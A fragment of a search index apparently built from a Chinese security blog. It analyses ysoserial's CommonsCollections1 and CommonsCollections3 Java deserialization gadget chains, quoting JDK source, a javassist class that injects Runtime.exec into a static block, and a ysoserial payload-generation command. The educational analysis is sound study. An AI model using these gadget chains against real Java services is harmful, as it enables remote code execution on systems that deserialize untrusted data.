\u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e\u80fd \u89e6\u53d1 \u4e0a\u9762 \u4e24\u4e2a \u5229\u7528 \u65b9\u5f0f \u7684 \u65b9\u6cd5 \u3002   \u540c\u6837 \u7684 \uff0c \u524d\u9762 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u63d0\u5230 \uff0c \u5982\u679c \u4e00\u4e2a \u5bf9\u8c61 \u7684 readObject \u51fd\u6570 \u88ab \u91cd\u8f7d \u4e86 \uff0c \u4f1a \u4f18\u5148 \u8c03\u7528 \u91cd\u8f7d \u540e \u7684 readObject \u51fd\u6570 \u3002   \u6211\u4eec \u6700\u597d \u80fd \u5728 \u88ab \u91cd\u8f7d \u7684 readObject \u51fd\u6570 \u4e2d \u53d1\u73b0 \u76f8\u5173 \u53ef\u63a7 Map \u6570\u636e \u7684 \u64cd\u4f5c ( get \u548c setValue ) \u3002   \u800c exp \u4e2d   sun . reflect . annotation . AnnotationInvocationHandler   \u975e\u5e38 \u7b26\u5408 \u4e0a\u8ff0 \u7684 \u63cf\u8ff0 \u3002   \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u7c7b \u7684 readObject \u5b9e\u73b0   private   void   readObject   (   java   .   io   .   ObjectInputStream   s   )   throws   java   .   io   .   IOException   ,   ClassNotFoundException   {   s   .   defaultReadObject   ( ) ;   / /   Check   to   make   sure   that   types   have   not   evolved   incompatibly   AnnotationType   annotationType   =   null   ;   try   {   annotationType   =   AnnotationType   .   getInstance   (   type   ) ;   }   catch   (   IllegalArgumentException   e   )   {   / /   Class   is   no   longer   an   annotation   type ;   time   to   punch   out   throw   new   java   .   io   .   InvalidObjectException   (   \" Non - annotation   type   in   annotation   serial   stream \"   ) ;   }   Map   <   String   ,   Class   < ? > >   memberTypes   =   annotationType   .   memberTypes   ( ) ;   / /   If   there   are   annotation   members   without   values ,   that   / /   situation   is   handled   by   the   invoke   method .   for   (   Map   .   Entry   <   String   ,   Object   >   memberValue   :   memberValues   .   entrySet   ( ) )   {   String   name   =   memberValue   .   getKey   ( ) ;   Class   < ? >   memberType   =   memberTypes   .   get   (   name   ) ;   if   (   memberType   ! =   null   )   {   / /   i . e .   member   still   exists   Object   value   =   memberValue   .   getValue   ( ) ;   if   (   !   (   memberType   .   isInstance   (   value   )   | |   value   instanceof   ExceptionProxy   ) )   {   memberValue   .   setValue   (   new   AnnotationTypeMismatchExceptionProxy   (   value   .   getClass   ( )   +   \" [ \"   +   value   +   \" ] \"   ) .   setMember   (   annotationType   .   members   ( ) .   get   (   name   ) ) ) ;   }   }   }   }   \u5728 \u7b2c 26 \u884c\u5904 \uff0c \u8c03\u7528 \u4e86 memberValue . setValue \uff0c \u8fd9\u91cc \u7684 memberValue \u6211\u4eec \u53ef\u4ee5 \u5c06 \u5176\u7f6e \u4e3a \u6784\u9020 \u597d \u7684 TransformedMap \u5b9e\u4f8b \u3002   \u5728 \u8fd9\u4e2a TransformedMap \u5b9e\u4f8b \u4e0a \uff0c valueTransformer \u5c5e\u6027 \u88ab \u7f6e \u4e3a \u524d\u6587 \u7684 ChainedTransformer \u3002 \u8fd9\u6837 \u8fd9\u4e2a \u94fe \u5c31 \u4e32 \u8d77\u6765 \u4e86 \uff0c \u603b\u7ed3 \u4e00\u4e0b   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValue . setValue ( )   = >   TransformedMap . setValue ( )   = >   TransformedMap . checkSetValue ( )   - >   valueTransformer . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u5229\u7528 LazyMap . get ( )   CommonsCollections1 \u4e2d \u5229\u7528 \u4e86 AnnotationInvocationHandler . invoke \u51fd\u6570   public   Object   invoke   (   Object   proxy   ,   Method   method   ,   Object   [ ]   args   )   {   String   member   =   method   .   getName   ( ) ;   / /   ...   switch   (   member   )   {   case   \" toString \"   :   return   toStringImpl   ( ) ;   case   \" hashCode \"   :   return   hashCodeImpl   ( ) ;   case   \" annotationType \"   :   return   type   ;   }   / /   Handle   annotation   member   accessors   Object   result   =   memberValues   .   get   (   member   ) ;   / /   ...   }   \u7b2c 15 \u884c \u8c03\u7528 \u4e86 memberValues . get \u51fd\u6570 \uff0c \u8fd9\u91cc \u5982\u679c memberValues \u8bbe\u7f6e \u4e3a \u6784\u9020 \u597d \u7684 LazyMap \u5b9e\u4f8b \uff0c \u5c06 \u89e6\u53d1 \u8be5 \u5229\u7528 \u94fe \u7684 \u6267\u884c \u3002   \u90a3\u4e48 \u600e\u4e48 \u6765 \u8c03\u7528 invoke \u51fd\u6570 \u5462 \uff1f \u8fd9\u91cc \u7528\u5230 \u4e86 Proxy \u52a8\u6001 \u4ee3\u7406 \u673a\u5236 \u3002 \u5728 \u8be5 \u673a\u5236 \u4e0b \u88ab \u4ee3\u7406 \u7684 \u5b9e\u4f8b \u4e0d\u7ba1 \u8c03\u7528 \u4ec0\u4e48 \u7c7b \u65b9\u6cd5 \uff0c \u90fd \u4f1a \u5148 \u8c03\u7528 invoke \u51fd\u6570 \u3002   \u90a3\u4e48 \u6211\u4eec \u5229\u7528 Proxy \u52a8\u6001 \u4ee3\u7406 AnnotationInvocationHandler \uff0c \u5e76 \u5c06 memberValues \u8bbe\u7f6e \u4e3a LazyMap \u3002 \u5728 AnnotationInvocationHandler . readObject \u51fd\u6570 \u91cc \uff0c \u7b2c 19 \u884c \u8c03\u7528 \u4e86 memberValues . entrySet \u51fd\u6570 \u3002 \u5728 \u52a8\u6001 \u4ee3\u7406 \u4e0b\u4f1a \u5148 \u8c03\u7528 invoke \u51fd\u6570 \uff0c \u4e14 \u6b64\u65f6 \u7684 \u51fd\u6570 \u540d entrySet \u4e0d \u5728 toString \u3001 hashCode \u3001 annotationType \u91cc \uff0c \u90a3\u4e48 \u4f1a \u6700\u7ec8 \u8d70\u5230 \u7b2c 15 \u884c \u7684 \u4f4d\u7f6e \u3002 \u603b\u7ed3 \u4e00\u4e0b \u8fd9\u4e2a \u8c03\u7528 \u94fe   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValues . entrySet ( )   - >   AnnotationInvocationHandler . invoke ( )   - >   memberValues . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u8fd9 \u4e5f \u662f ysoserial \u7684 CommonsCollections1 \u7684 \u8c03\u7528 \u94fe \u3002   \u540e\u7eed \u7684 \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790 \u653e\u5728 \u4e0b \u4e00\u7bc7 \u6587\u7ae0 \u91cc \u3002","title":"1 .   CommonsCollections1 ( jdk & lt ; = 7 )"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x04","text":"\u7ecf\u8fc7 \u5bf9 ysoserial \u5de5\u5177 \u751f\u6210 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u8c03\u8bd5 \uff0c \u719f\u6089 \u4e86 Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e00\u4e2a \u6d41\u7a0b \u3002 \u4f46 \u5bf9\u4e8e exp \u7684 \u4e66\u5199 \u4ecd\u7136 \u6709\u5f85 \u63d0\u9ad8 \u3002   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c CommonCollections1 \u548c 3 \u7528 \u7684 override . class \u4f5c\u4e3a Annotation \u5728 jdk8 \u4e0a \u662f \u4e0d \u9002\u7528 \u7684 \uff0c \u8981 \u8c03\u8bd5 \u8fd9 \u4e24\u4e2a payload \u9700\u8981 \u7528 jdk7 \uff0c   \u53c2\u8003   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u5728 \u8c03\u8bd5 \u8fc7\u7a0b \u4e2d \uff0c \u4f53\u4f1a \u5230 \u4e86 javassist \u5e93 \u7684 \u5f3a\u5927 \uff0c \u4fee\u6539 jar \u5305\u91cc \u7684 class \u6587\u4ef6 \u975e\u5e38 \u8212\u670d \uff01   Proxy \u7684 \u52a8\u6001 \u4ee3\u7406 \u673a\u5236 \uff0c Java \u7684 \u53cd\u5c04 \u673a\u5236 \u76f8\u4fe1 \u4f1a \u662f \u540e\u7eed \u5b66\u4e60 \u7684 \u4e00\u4e2a \u91cd\u70b9 \uff0c \u7ee7\u7eed \ud83d\udcaa \uff01","title":"0x04   \u603b\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/","tags":["java"],"text":"0x00   \u524d\u8a00   \u524d\u9762 \u5206\u6790 \u4e86 ysoserial \u7684 CommonsCollections1 \uff0c \u719f\u6089 \u4e86 \u4e00\u70b9 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u672c\u6587 \u5c06 \u7ee7\u7eed \u5206\u6790 ysoserial \u7684 \u5229\u7528 \uff0c \u4eca\u5929 \u7684 \u4e3b\u89d2 \u662f CommonsCollections3 .   0x01   \u73af\u5883 \u51c6\u5907   \u9996\u5148 \u7531\u4e8e override \u7684 \u539f\u56e0 \uff0c \u73af\u5883 \u4f7f\u7528 \u7684 \u662f jdk7u80 \u3002 \u5229\u7528 ysoserial \u751f\u6210 payload \uff0c \u5e76 \u8f7d\u5165 \u8c03\u8bd5 \u3002   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections3   \" open   / System / Applications / Calculator . app \"   >   commonscollections3 . ser   0x02   \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   \u5728 \u5206\u6790 \u5f00\u59cb \u524d \uff0c \u5148 \u8865\u5145 \u4e00\u4e0b \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   public   class   StaticBlockTest   {   }   public   class   Cracker   {   public   static   byte   [ ]   generate   ( ) {   try   {   String   code   =   \" { java . lang . Runtime . getRuntime ( ) . exec ( \\ \" open   / System / Applications / Calculator . app \\ \" ) ; } \"   ;   ClassPool   pool   =   ClassPool   .   getDefault   ( ) ;   CtClass   clazz   =   pool   .   get   (   StaticBlockTest   .   class   .   getName   ( ) ) ;   clazz   .   setName   (   \" demo \"   ) ;   clazz   .   makeClassInitializer   ( ) .   insertAfter   (   code   ) ;   return   clazz   .   toBytecode   ( ) ;   / /   ...   }   public   static   void   main   (   String   [ ]   args   )   {   byte   [ ]   clazz   =   generate   ( ) ;   DefiningClassLoader   loader   =   new   DefiningClassLoader   ( ) ;   Class   cls   =   loader   .   defineClass   (   \" demo \"   ,   clazz   ) ;   / /   \u4ece \u5b57\u8282 \u6570\u7ec4 \u4e2d \u6062\u590d \u7c7b   try   {   cls   .   newInstance   ( ) ;   / /   \u5b9e\u4f8b \u5316 \u8be5\u7c7b \u65f6\u4f1a \u81ea\u52a8 \u8c03\u7528 \u9759\u6001 \u5757 \u5185 \u7684 \u4ee3\u7801   }   / /   ...   }   }   \u901a\u8fc7 \u4e0a\u9762 \u8fd9\u4e2a \u4f8b\u5b50 \uff0c \u6211\u4eec \u53ef\u4ee5 \u83b7\u5f97 \u7684 \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u4e3b\u8981 \u4e3a \u4e24\u70b9 \uff1a   \u200b   a .   defineClass \u53ef\u4ee5 \u4ece byte \u6570\u7ec4 \u4e2d \u6062\u590d \u4e00\u4e2a Class   \u200b   b .   static   initializer \u5728 \u7c7b \u8f7d\u5165 \u65f6 \u5c06 \u81ea\u52a8 \u6267\u884c \uff08 \u9759\u6001 \u5757 \u5185 \u7684 \u4ee3\u7801 \uff09   Java \u4e2d \u52a8\u6001 \u8c03\u7528 \u7684 \u53e6 \u4e00\u79cd \u65b9\u5f0f \u662f   defineClass   Java \u63d0\u4f9b \u4e86 ClassLoader \u4ece bytes \u6570\u7ec4 \u4e2d \u8fd8\u539f Class \u7684 \u65b9\u6cd5 \uff0c defineClass \u51fd\u6570 \u5c31\u662f \u5b8c\u6210 \u8fd9\u4e00 \u8fc7\u7a0b \u7684 \u51fd\u6570 \u3002   \u7406\u8bba \u4e0a \uff0c \u5982\u679c \u4ee3\u7801 \u4e2d \u4f7f\u7528 \u4e86 \u8fd9\u79cd \u65b9\u5f0f \uff0c \u4e14 byte \u6570\u636e \u7684 \u5185\u5bb9 \u53ef\u63a7 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6267\u884c \u4efb\u610f Java \u4ee3\u7801 \u3002 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u5462 \uff1f   \u8fd9\u91cc \u7528\u5230 \u5c31\u7528\u5230 \u4e86 Java \u7c7b \u7684 \u53e6 \u4e00\u4e2a \u7279\u6027 \uff0c static   block \u5728 \u7c7b \u8f7d\u5165 \u65f6 \u81ea\u52a8 \u6267\u884c \u5757 \u5185 \u7684 \u4ee3\u7801 \u3002 \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 javassist \u5bf9 \u9759\u6001 \u5757 \u6ce8\u5165 \u4efb\u610f \u4ee3\u7801 \uff0c \u8be5\u7c7b \u88ab \u6062\u590d \u5e76 \u8f7d\u5165 \u65f6\u4f1a \u8c03\u7528 \u6ce8\u5165 \u7684 \u4ee3\u7801 \uff0c \u540e\u6587 \u7684 \u5229\u7528 \u94fe \u4e3b\u8981 \u5c31\u662f \u7528\u5230 \u4e86 \u8fd9 \u4e24\u4e2a \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u3002   0x03   \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790   1 .   \u524d\u666f \u56de\u987e   \u8fd9\u91cc \u9009\u62e9 CommonsCollections3 \u56e0\u4e3a \u662f\u56e0\u4e3a \u4ed6 \u7684 \u524d\u534a \u534a\u6bb5 \u524d\u534a\u6bb5 \u89e6\u53d1 \u7684 \u5229\u7528 \u94fe \u8ddf CommonsCollections1 \u662f \u4e00\u6837 \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u53ea \u9700\u8981 \u5206\u6790 \u540e\u534a \u534a\u6bb5 \u540e\u534a\u6bb5 \u547d\u4ee4 \u6267\u884c \u7684 \u6784\u9020 \u5373\u53ef \u3002 \u56de\u987e \u4e00\u4e0b \u524d\u534a \u534a\u6bb5 \u524d\u534a\u6bb5 \u5229\u7528 \u94fe   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValues . entrySet ( )   - >   AnnotationInvocationHandler . invoke ( )   - >   memberValues . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   iTransformers [ ] . transform ( )   CommonsCollections1 \u4e2d ChainedTransformer . transform ( ) \u4f1a \u5faa\u73af \u8c03\u7528 iTransformers \u6570\u7ec4 \u91cc \u7684 \u5bf9\u8c61 \u7684 transform \u51fd\u6570 \u3002 CommonsCollections1 \u7528 \u7684 \u662f InvokerTransformer \u7684 transform \uff0c \u56e0\u4e3a \u8be5 \u51fd\u6570 \u5b9e\u73b0 \u4e86 \u53cd\u5c04 \u8c03\u7528 \u4efb\u610f \u7c7b \u7684 \u529f\u80fd \u3002 \u90a3\u4e48 \u9664\u4e86 \u4f7f\u7528 InvokerTransformer \u8fd8\u6709 \u6ca1\u6709 \u5176\u4ed6 \u7684 \u65b9\u6cd5 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff01   2 .   \u65b0 \u7684 \u547d\u4ee4 \u6267\u884c \u5229\u7528 \u94fe   \u6765\u770b \u4e00\u4e0b CommonsCollections3 \u7684 payloads \u6784\u9020   Object   templatesImpl   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   real   chain   for   after   setup   final   Transformer   [ ]   transformers   =   new   Transformer   [ ]   {   new   ConstantTransformer   (   TrAXFilter   .   class   ) ,   new   InstantiateTransformer   (   new   Class   [ ]   {   Templates   .   class   } ,   new   Object   [ ]   {   templatesImpl   }   ) } ;   / /   \u540e\u7eed \u7c7b\u4f3c   \u7701\u7565   ConstantTransformer   \u4e0a \u4e00\u7bc7 \u5df2\u7ecf \u8bf4 \u8fc7 \u4e86 \uff0c \u5176   transform   \u4f1a \u8fd4\u56de \u6784\u9020 \u65f6 \u7684 \u5bf9\u8c61 \uff0c \u8fd9\u91cc \u5c31\u662f   TrAXFilter . class   \u5bf9\u8c61 \u3002   \u6211\u4eec \u91cd\u70b9 \u6765\u770b   InstaniateTransformer   \u7684   transform   \u51fd\u6570   \u7b80\u5355 \u6765\u770b \uff0c \u8be5 \u51fd\u6570 \u5bf9 \u8f93\u5165 \u7684 input \uff08 \u8fd9\u91cc \u5c31\u662f TrAXFilter . class \uff09 \u505a \u5b9e\u4f8b \u5316 \u7684 \u64cd\u4f5c \u3002 \u8fd9\u91cc \u770b\u8d77 \u8d77\u6765 \u770b\u8d77\u6765 \uff0c \u5176\u5b9e \u6709\u70b9 \u6709\u70b9\u50cf php \u4e2d \u627e \u5bf9\u5e94 \u7684 __ constructs \uff0c \u5728 Java \u91cc \u6211\u4eec \u5c31 \u53bb \u627e \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u91cc \u505a \u4e86 \u5371\u9669 \u64cd\u4f5c \u7684 class \u3002   \u6765\u770b \u4e00\u4e0b   TrAXFilter   \u7c7b \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u8fd9\u91cc \u7684   templates   \u5c31\u662f \u4e0a\u9762 exp \u4e2d \u6784\u9020 \u7684   templatesImpl   .   \u7ee7\u7eed \u770b TransformerImpl \u7684 newTransformer \u51fd\u6570   org . apache . xalan . internal . xsltc . trax . TemplatesImpl . java : newTransformer : 481   \u7ee7\u7eed \u770b   getTransletInstance   \u518d \u7ee7\u7eed   defineTransletClasses   \u770b\u5230 \u8fd9\u91cc \u4e0d\u662f \u662f\u4e0d\u662f \u6709\u70b9 \u719f\u6089 \uff0c \u6ca1\u9519 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86 0x02 \u4e2d \u7684 \u4e24\u4e2a \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u3002   defineTransletClasses   \u8fd8\u539f \u51fa\u7c7b \uff0c   getTransletInstance   \u8fdb\u884c \u5b9e\u4f8b \u5316 \u3002 \u90a3\u4e48 \u6211\u4eec \u53ea \u9700\u8981 \u6784\u9020 \u4e00\u4e2a \u5408\u9002 \u7684   _ bytecodes   \u5373\u53ef \u6267\u884c \u4efb\u610f Java \u4ee3\u7801 \u3002   \u4e0b\u9762 \u8865\u5145 \u4e00\u4e0b \uff0c \u5728 \u6784\u9020 exp \u65f6 \u9700\u8981 \u6ee1\u8db3 \u7684 \u6761\u4ef6 \uff1a   \u690d\u5165 \u7684   templates   \u4e3a   TransformerImpl   \u7c7b \uff0c \u4ece\u800c \u8c03\u7528 \u540e\u7eed \u7684   newTransformer   \u51fd\u6570   \u690d\u5165 \u7684   templates   \u5b9e\u4f8b \uff0c   _ name   \u4e0d \u4e3a   null   ,   _ class   \u4e3a   null   \u690d\u5165 \u7684   templates   \u5b9e\u4f8b \uff0c   _ bytecodes   \u4e0d \u4e3a   null   ,   _ tfactory   \u4e3a   TransformerFactoryImpl   \u5bf9\u8c61   \u690d\u5165 \u7684   templates ._ bytecodes   \u6570\u7ec4 \uff0c \u5176 \u6700\u7ec8 \u8fd8\u539f \u7684 \u5bf9\u8c61 \u7236\u7c7b \u4e3a   com . sun . org . apache . xalan . internal . xsltc . runtime . AbstractTranslet   \u90a3\u4e48 \u600e\u4e48 \u624d\u80fd \u6ee1\u8db3 \u8fd9\u4e9b \u6761\u4ef6 \u5462 \uff1f \u8fd9\u91cc \u795e\u5947 \u7684 javassist \u53c8 \u8981 \u4e0a\u573a \u5566 \uff01   \u6765\u770b \u4e00\u4e0b ysoserial \u7684 \u64cd\u4f5c   \u4e0a\u9762 \u7684 \u4ee3\u7801 \u4e0d \u505a \u7701\u7565 \uff0c \u6211\u4eec \u5e94\u8be5 \u597d\u597d \u597d\u5b66 \u5b66\u4e60 \u597d\u597d\u5b66 \u597d\u597d\u5b66\u4e60 \u4e00\u4e0b javassist \u7684 \u57fa\u672c \u64cd\u4f5c \u57fa\u672c\u64cd\u4f5c \uff0c \u4ee3\u7801 \u53ef\u4ee5 \u5728   Gadgets . createTemplatesImpl   \u627e\u5230 \uff01   \u8fd9\u91cc \u6846 \u4e86 \u4e24\u4e2a \u6846 \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u6846\u662f \u901a\u8fc7 javassist \u6ce8\u5165 \u9759\u6001 \u5757 \uff0c \u9759\u6001 \u5757 \u7684 \u5185\u5bb9 \u5c31\u662f \u6211\u4eec \u9700\u8981 \u6267\u884c \u7684 \u547d\u4ee4 \u3002 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u6846\u662f ysoserail \u6846\u67b6 \u81ea\u5df1 \u5c01\u88c5 \u7684 \u4e00\u4e2a \u53cd\u5c04 \u5de5\u5177 \u7c7b \uff0c \u901a\u8fc7 \u8fd9\u4e2a \u7c7b \u6211\u4eec \u53ef\u4ee5 \u52a8\u6001 \u7684 \u64cd\u4f5c   templates   \u5b9e\u4f8b \u7684 \u7c7b \u5c5e\u6027 \u5185\u5bb9 \u3002 \u8fd9\u91cc \u4e3b\u8981 \u5c31\u662f \u5728 \u6ee1\u8db3 \u4e0a\u8ff0 \u7684 \u51e0\u4e2a \u6761\u4ef6 \u3002   \u8fd9\u91cc \u6709 \u4e00\u70b9 \u53ef\u4ee5 \u63d0 \u4e00\u4e0b \uff0c \u8be5 \u5229\u7528 \u94fe \u7684 \u4f5c\u8005 \u5728 \u586b\u5145   _ bytecodes   \u65f6 \uff0c \u989d\u5916 \u586b\u5145 \u4e86 \u4e00\u4e2a \u65e0\u5173 \u7684 \u7c7b ( \u4e0a\u56fe \u7b2c 130 \u884c ) \u3002 \u8fd9\u4e2a \u7c7b \u4e3b\u8981 \u7528\u4e8e \u6ee1\u8db3   _ auxClasses   , \u8ba9 \u8fd9\u4e2a   getTransletInstance   \u51fd\u6570 \u80fd \u6b63\u5e38 \u8d70 \u5b8c \u3002   \u7ecf\u8fc7 \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053   getTransletInstance   \u7684 \u7b2c 408 \u884c \uff0c \u5bf9   _ class   \u505a \u5b9e\u4f8b \u5316 \u65f6 \u6211\u4eec \u60f3\u8981 \u6267\u884c \u7684 \u4ee3\u7801 \u5c31 \u5df2\u7ecf \u6267\u884c \u4e86 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u989d\u5916 \u586b\u5145 \u7684 \u7c7b \u5176\u5b9e \u662f \u53ef\u6709 \u53ef\u65e0 \u53ef\u6709\u53ef\u65e0 \u7684 \u3002   0x04   \u603b\u7ed3   \u5230 \u8fd9\u91cc \uff0c \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a CommonsCollections3 \u5c31 \u5206\u6790 \u7ed3\u675f \u4e86 \u3002   CommonsCollections3 \u4e3b\u8981 \u5229\u7528 \u4e86 \u53ef\u63a7 \u7684 byte \u6570\u7ec4 \u4ece defineClass \u51fd\u6570 \u4e2d \u8fd8\u539f \u51fa \u6076\u610f \u6784\u9020 \u7684 Class \u3002 \u5e76\u4e14 \u5728 \u540e\u7eed \u7684 \u8c03\u7528 \u4e2d \uff0c \u8fd9\u4e2a Class \u88ab \u6ce8\u5165 \u5230 \u5185\u5b58 \u4e2d \uff0c \u4ece\u800c \u6267\u884c \u4e86 \u6ce8\u5165 \u7684 \u9759\u6001 \u5757 \u7684 \u4ee3\u7801 \uff0c \u5b9e\u73b0 \u4e86 \u4efb\u610f Java \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u3002   \u5230 \u8fd9\u7bc7 \u4e3a\u6b62 \uff0c \u6211\u4eec \u5df2\u7ecf \u77e5\u9053 \u4e86 \u4e24\u79cd Java \u7684 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6784\u9020 \u65b9\u5f0f   \u5229\u7528 \u53ef\u63a7 \u7684 \u53cd\u5c04 \u673a\u5236 \u3002 \u5177\u4f53 \u7684 Class \u3001 Method \u7b49 \u5747 \u53ef\u63a7 \u65f6 \uff0c \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \uff0c \u53ef\u4ee5 \u6784\u9020 \u51fa \u4efb\u610f \u7684 \u7c7b \u8c03\u7528 \u3001 \u7c7b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528   \u5229\u7528 \u53ef\u63a7 \u7684 defineClass \u51fd\u6570 \u7684 byte \u6570\u7ec4 \u3002 \u6784\u9020 \u6076\u610f \u7684 Class \u5b57\u8282 \u7801 \u6570\u7ec4 \uff0c \u5e38\u4e8e \u9759\u6001 \u5757 \u6ce8\u5165 \u6076\u610f \u4ee3\u7801 \u6076\u610f\u4ee3\u7801   20191104   \u8865\u5145   \u524d\u9762 \u7684 \u5206\u6790 \u5e76 \u6ca1\u6709 \u63d0\u5230 3.2 . 2 \u7248\u672c \u53d1\u751f \u4e86 \u5565\u4e8b \uff0c \u5bfc\u81f4 \u4e86 \u5229\u7528 \u94fe \u7684 \u5931\u6548 \uff0c \u8fd9\u91cc \u7b80\u5355 \u63d0 \u4e00\u4e0b   3.2 . 2 \u7248\u672c \u5bf9 InvokerTransformer \u589e\u52a0 \u4e86 readObject \u51fd\u6570 \uff0c \u5e76\u4e14 \u505a \u4e86 \u662f\u5426 \u5141\u8bb8 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u68c0\u67e5 \uff0c \u5728   FunctorUtils . checkUnsafeSerialization   \u51fd\u6570 \u5185 \u3002   \u8fd9\u91cc UNSAFE _ SERIALIZABLE _ PROPERTY \u7684 \u503c \u9ed8\u8ba4 \u4e3a false \uff0c \u5982\u679c \u9700\u8981 \u4e3a true \uff0c \u9700\u8981 \u5728 \u8fd0\u884c \u65f6 \u6307\u5b9a \u3002   \u6240\u4ee5 \u5728 \u4f7f\u7528 InvokerTransformer \u4f5c\u4e3a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u65f6 \uff0c \u4f1a throw \u4e00\u4e2a exception \u3002 \u9664\u4e86 InvokerTransformer \u7c7b\u5916 \uff0c \u8fd8\u6709 CloneTransformer ,   ForClosure ,   InstantiateFactory ,   InstantiateTransformer ,   InvokerTransformer ,   PrototypeCloneFactory ,   PrototypeSerializationFactory ,   WhileClosure \u3002 \u6240\u4ee5 \u5728 3.2 . 2 \u7248\u672c \u4ee5\u4e0a \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u5229\u7528 \u94fe \u90fd \u5df2\u7ecf \u5e9f \u4e86 \u3002   \u5f53\u7136 \uff0c \u8fd9\u79cd \u65b9\u6cd5 \u6cbb\u6807 \u4e0d\u6cbb \u6cbb\u672c \u6cbb\u6807\u4e0d\u6cbb\u672c \uff0c \u5982\u679c \u53ef\u4ee5 \u5728 \u8fd9\u4e9b \u7c7b \u4ee5\u5916 \uff0c \u6784\u9020 \u4e00\u4e2a \u5229\u7528 \u94fe \u540c\u6837 \u53ef\u4ee5 \u8fbe\u5230 \u524d\u9762 \u7684 \u6548\u679c \u3002","title":"Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections3"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x00","text":"\u524d\u9762 \u5206\u6790 \u4e86 ysoserial \u7684 CommonsCollections1 \uff0c \u719f\u6089 \u4e86 \u4e00\u70b9 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u672c\u6587 \u5c06 \u7ee7\u7eed \u5206\u6790 ysoserial \u7684 \u5229\u7528 \uff0c \u4eca\u5929 \u7684 \u4e3b\u89d2 \u662f CommonsCollections3 .","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x01","text":"\u9996\u5148 \u7531\u4e8e override \u7684 \u539f\u56e0 \uff0c \u73af\u5883 \u4f7f\u7528 \u7684 \u662f jdk7u80 \u3002 \u5229\u7528 ysoserial \u751f\u6210 payload \uff0c \u5e76 \u8f7d\u5165 \u8c03\u8bd5 \u3002   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections3   \" open   / System / Applications / Calculator . app \"   >   commonscollections3 . ser","title":"0x01   \u73af\u5883 \u51c6\u5907"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x02","text":"\u5728 \u5206\u6790 \u5f00\u59cb \u524d \uff0c \u5148 \u8865\u5145 \u4e00\u4e0b \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   public   class   StaticBlockTest   {   }   public   class   Cracker   {   public   static   byte   [ ]   generate   ( ) {   try   {   String   code   =   \" { java . lang . Runtime . getRuntime ( ) . exec ( \\ \" open   / System / Applications / Calculator . app \\ \" ) ; } \"   ;   ClassPool   pool   =   ClassPool   .   getDefault   ( ) ;   CtClass   clazz   =   pool   .   get   (   StaticBlockTest   .   class   .   getName   ( ) ) ;   clazz   .   setName   (   \" demo \"   ) ;   clazz   .   